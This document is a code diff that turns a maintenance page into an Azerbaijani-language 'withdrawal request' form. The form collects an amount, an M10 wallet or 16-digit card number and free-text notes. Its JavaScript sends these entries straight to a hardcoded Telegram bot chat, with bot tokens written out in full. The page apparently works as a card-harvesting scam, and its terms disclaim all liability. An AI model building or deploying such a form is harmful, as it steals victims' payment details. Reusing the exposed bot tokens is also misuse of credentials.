@@ -3,91 +3,335 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HDMI Not Found</title>
+    <title>Çıxarış göndər</title>
     <style>
         body {
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: #0a0a0a;
             margin: 0;
-            font-family: 'Arial', sans-serif;
-            color: #fff;
+            background: linear-gradient(45deg, #838588, #007bff);
         }
-
         .container {
+            width: 350px;
+            padding: 100px 20px;
+            position: relative;
+            top: -60px;
+            overflow: hidden;
+            border: 1px solid hsl(0, 0%, 80%, 0);
+            box-shadow: 0 0 10px 1px rgba(0, 0, 0, 0.7);
             text-align: center;
-            position: relative;
+            background-color: hsla(202, 41%, 35%, 0.3);
+            backdrop-filter: blur(13px);
+            border-radius: 20px;
         }
-
-        h1 {
-            font-size: 50px;
-            margin-bottom: 10px;
+        .container h1{
+            color: hsla(0, 23%, 97%, 0.6);
+            border-bottom: 4px solid #333;
+            margin-top: -80px;
+            margin-bottom: 60px;
+            transition: 0.3s;
         }
-
-        p {
-            font-size: 20px;
-            color: #888;
+        .container h1:hover{
+            color: hsla(0, 23%, 97%, 1);
+            transform: scale(1.01);
+            transition: 0.3s;
         }
-
-        .glow-btn {
-            padding: 15px 30px;
-            font-size: 18px;
-            background: none;
-            border: 2px solid #0ff;
-            border-radius: 5px;
-            color: #0ff;
-            cursor: pointer;
-            position: relative;
-            z-index: 1;
-            transition: all 0.4s ease;
-            outline: none;
-        }
-
-        .glow-btn:before {
-            content: '';
-            position: absolute;
-            top: -5px;
-            left: -5px;
-            right: -5px;
-            bottom: -5px;
-            background: linear-gradient(90deg, #0ff, transparent, #0ff);
+        img{
             z-index: -1;
-            border-radius: 5px;
-            opacity: 0;
-            transition: opacity 0.4s ease, transform 0.4s ease;
-            transform: scale(0.9);
+            width: 100%; /* Genişlik %100 */
+            height: 100%; /* Yükseklik %100 */
+            object-fit: cover; /* Görüntüyü div'e sığdır, orantıyı koru */
+            position: absolute; /* Mutlak konum */
+            top: 50%; /* Yukarıdan ortala */
+            left: 50%; /* Soldan ortala */
+            transform: translate(-50%, -50%); /* Gerçekten ortala */
         }
-
-        .glow-btn:hover:before {
-            opacity: 1;
-            transform: scale(1);
+        input[type="text"] {
+            width: 80%;
+            padding: 10px;
+            margin: 10px;
+            border: 1px solid hsl(0, 0%, 24%, 0.0);
+            border-bottom: 0px solid rgba(0, 0, 0, 1);
+            background-color: hsla(0, 0%, 80%, 0.0);
+            color: #000;
+            font-size: 17px;
+            border-radius: 7px 7px 0px 0px;
+            box-shadow: 0px 0px 0px 0px #333;
+            transition: 0s;
         }
-
-        .glow-btn:hover {
+        input[type="text"]:hover{
+            border-bottom: 1.5px solid rgba(0, 0, 0, 1);
+            box-shadow: 0px 0px 10px 1px #333;
             color: #fff;
-            border-color: #fff;
+            transition: 0.1s;
         }
-
-        .hdmi-icon {
-            font-size: 80px;
-            color: #f00;
-            animation: flicker 1s infinite alternate;
+        input::placeholder{
+            color: #ffffff;
+            opacity: 0.8;
+            transition: 0s;
+            text-shadow: 0px 0px 5px #000;
         }
+        input:hover::placeholder{
+            color: #FFF;
+            opacity: 0.99;
+            transition: 0.5;
+        }
+        button {
+            padding: 10px 100px;
+            margin: 50px 10px;
+            margin-bottom: 0px;
+            background-color: hsl(0, 0%, 0%, 0.01);
+            color: hsla(0, 9%, 94%, 0.6);
+            text-shadow: 0px 0px 40px #121, 0px 0px 40px #222, 0px 0px 70px #222;
+            border: 1 px solid hsl(0, 0%, 24%, 0.0);
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 19px;
+            box-shadow: 0px 0px 15px 0.5px #000;
+            transition: 200ms linear;
+        }
+        button:hover {
+            background-color: #0056b3;
+            box-shadow: 0px 0px 10px 1px #000,
+                        inset -1px -1px 3px 1px #000;
+            color: hsl(0, 0%, 100%, 1);
+            
+            }
 
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
+        .messageBox{
+            position: absolute;
+            top: 300px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 250px;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            font-size: 16px;
+            border-radius: 10px;
+            display: none;
+        }
+        .x_btn{
+            color: #FFF;
+            position: fixed;
+            top: 0px;
+            right: 12px;
+            font-size: 25px;
+            cursor: pointer;
+        }
+        .YesNo{
+            display: block;
+            cursor: pointer;
+            font-size: 70px;
+            
+            
+        }
+        .YesNo_box{
+            position: absolute;
+            display: flex;
+            width: 200px;
+            padding-left: 35%;
+            background-color: rgba(0, 0, 0, 0.0);
+            color: white;
+            opacity: 0.9;
+            font-size: 15px;
+            border-radius: 5px;
+            text-shadow: 0px 0px 10px #000;
+        }
+        
+
+
+        .InfoBox{
+            position: absolute;
+            top: 81%;
+            background-color: hsl(0, 0%, 0%, 0.7);
+            backdrop-filter: blur(3px);
+            width: 100%;
+            height: auto;
+            box-shadow: 0px 0px 10px 1px ;
+            
+        }
+        .InfoBox *{
+            text-shadow: 0px 0px 10px #333;
+            color: #ccc;
+            padding-right: 15px;
+            padding-left: 15px;
+        }
+        .message_box{
+            margin-top: 50px;
+            background-color: hsla(0, 23%, 97%, 0.1);
+            width: 290px;
+            height: 60px;
+            border-radius: 10px;
+            padding: 10px;
+            color: #000;
+            border: 1px solid #000;
+            box-shadow: 0px 0px 5px 0.1px hsl(0, 0%, 0%);
+            transition: 0.2s;
+
+        }
+        .message_box:hover{
+            color: #fff;
+            transform: scale(1.03);
+            transition: 0.2s;
+        }
+        .message_box::placeholder{
+            color: hsla(148, 30%, 92%, 0.881);
+            text-shadow: 0px 0px 10px #333;
+        }
+        .message_box:hover::placeholder{
+            color: hsl(0, 0%, 100%, 1);
+            transition: 0.3s;
+        }
+        .Onay_content{
+            display: flex;
+            margin-left: 20px;
+            justify-content: space-between;
+            width: 300px;
+            background-color: rgba(0, 0, 0, 0.1);
+            color: white;
+            border-radius: 10px;
+            text-align: center;
         }
     </style>
+
+
+
 </head>
 <body>
+
+
+    <img src="https://wallpapercave.com/wp/wp9589672.jpg" alt = "Fotoraf bulunmadı">
+    
     <div class="container">
-        <div class="hdmi-icon">📺</div>
-        <h1>404 Not Found</h1>
-        <p>səyfədə düzəliş gedir yaxında aktivləşcəy </p>
+        <h1>Çıxarış isdəyi göndər.</h1>
+        <input type="text" class="text" id = "Entry_money" placeholder="Çıxarış məbləgi">
+        <input type="text" class="text" id = "Entry_kod" placeholder="M10 & 16 rəgəmli Kart kodu">
+        <div class="Onay_content" id = "Onay_content">
+        </div>
+        <textarea class="message_box" id="message_box" placeholder="Zəhmət olmasa, əməliyyatla bağlı əlavə qeydinizi və ya istəyinizi bura yazın. Sizə kömək etməyimiz üçün vacib hesab etdiyiniz detalları paylaşa bilərsiniz."></textarea>
+        <label class="YesNo_box"><input type="checkbox" id="checkbox" class="YesNo"><u>Çıxarış şərtlərini oxunudum</u></label>
+        <button onclick="mesajGonder()">Isdəy gönder</button>
     </div>
+
+
+    <div class = "messageBox" id="Sms_box">
+        <h4 class="x_btn" id="X_btn"><span onclick="Off_message_box()">&#10006</span></h4>
+        <h3>Mesaj:</h3>
+        <p id="messageBoxContent">Error</p>
+    </div>
+
+    <div id="infoBox" class="InfoBox">
+        <h4>Para Gönderme Talebi</h4>
+        <h5>Şartlar:
+
+            Gönderim işlemi için yeterli bakiye olmalıdır. Yetersiz bakiye durumunda işlem onaylanmayacaktır.
+            
+            Girilen Kullanıcı ID'si ve kart / M10 numarası doğru olmalıdır. Yanlış girişlerde para iadesi yapılmayacaktır.
+            
+            Bu işlemle ilgili hiçbir hükümlülüğümüz yoktur.
+            
+            
+            </h5>
+            <h5><b>Not: Lütfen tüm bilgilerinizi dikkatlice kontrol ediniz.</b></h5>
+    </div>
+
+
+
+    <script>
+        function Off_message_box(){
+            document.getElementById("Sms_box").style.display="none";
+        }
+        function ID_dogrula(){
+            var user_id = localStorage.getItem("entry_id");
+            window.kod = Math.floor(Math.random() * 9000) + 1000; 
+            mesaj = `Sizin çıxarış təsdiq kodunuz bu kodu heç kim ilə paylaşmayın! \nKod: ${window.kod}`
+            fetch('https://api.telegram.org/bot7435782633:AAEp2NlpQLN0LuYWXPvtYuFGHYTrG8p_ouc/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: user_id,  // Sizin Chat ID'niz
+                    text: mesaj             // Entry'den alınan mesajı gönderiyoruz
+                })
+            })
+            document.getElementById("Sms_box").style.display="block";
+            messageBoxContent.innerHTML = "tesdiy kodu göndərildi";
+        }
+        function mesajGonder() {
+            var user_id = localStorage.getItem("entry_id");
+            const miktar = document.getElementById('Entry_money').value;
+            const kod = document.getElementById('Entry_kod').value;
+            const user_not = document.getElementById("message_box").value;
+            var saat = new Date();
+            const mesaj = `ID: ${user_id} \nMəbləğ: ${miktar}AZN \nNumara: ${kod} \nNot:\n${user_not}\n\n${saat}`;
+            const User_mesaj = `Çıxarış isdəyi: \nMəbləğ: ${miktar}AZN \nNumara: ${kod} \nNot:\n${user_not}\n\n${saat}`;
+            
+                // Miktarın geçerli bir pozitif sayı olup olmadığını kontrol et
+                const miktarFloat = parseFloat(miktar);
+                if (isNaN(miktarFloat) || miktarFloat < 4 ) {
+                    messageBoxContent.innerHTML = "Keçeli bir məbləğ daxil et minumum çıxarış 4AZN təşkil edir.";
+                    document.getElementById("Sms_box").style.display="block";
+                    document.getElementById("Entry_money").value = ''
+
+                    return;
+                }
+            
+                // Kodun boş olup olmadığını kontrol et
+                if (!kod.trim()) {
+                    messageBoxContent.innerHTML = "Kod boş olamaz. M10 & Kartın 16 rəqəmi";
+                    document.getElementById("Sms_box").style.display="block";
+                    document.getElementById("Entry_kod").value = ''
+
+                    return;
+                }
+
+                if (checkbox.checked) {
+                    messageBoxContent.innerHTML = "mesac ugurla gonderildi";
+                    document.getElementById("Sms_box").style.display="block";
+                    
+                }
+                else {
+                    messageBoxContent.innerHTML = "Şərtlər grbul olunmadı!";
+                    document.getElementById("Sms_box").style.display="block";
+                    return;
+                }
+
+            
+                // Mesaj geçerli ise burada işleme devam edebilirsiniz
+                message = `ID: ${user_id} \nMəbləğ: ${miktarFloat} \nKod: ${kod}`;
+                messageBoxContent.innerHTML = `ID: ${user_id} \nMəbləğ: ${miktarFloat} \n Kod: ${kod}`;
+                
+                document.getElementById("Entry_kod").value = ''
+                document.getElementById("Entry_money").value = ''
+                document.getElementById("message_box").value = ''
+                
+                var KOD_len = kod.length
+                if (!(KOD_len > 8)) {
+                    messageBoxContent.innerHTML = "Kaşlok kodu düzgün görsənmir!";
+                    document.getElementById("Sms_box").style.display="block";
+                    return;
+                }
+
+                messageBoxContent.innerHTML = `isdek gonderildi\n${message}`
+                document.getElementById("Sms_box").style.display="block";
+                // Telegram API'si üzerinden mesaj gönderme
+                fetch('https://api.telegram.org/bot7305999237:AAEZKowGcSZWf3btGW0dYOtT2TWlwpxXlzY/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: '6726703804',  // Sizin Chat ID'niz
+                        text: mesaj             // Entry'den alınan mesajı gönderiyoruz
+                    })
+                
+                })
+            }
+
+    </script>
 </body>
 </html>
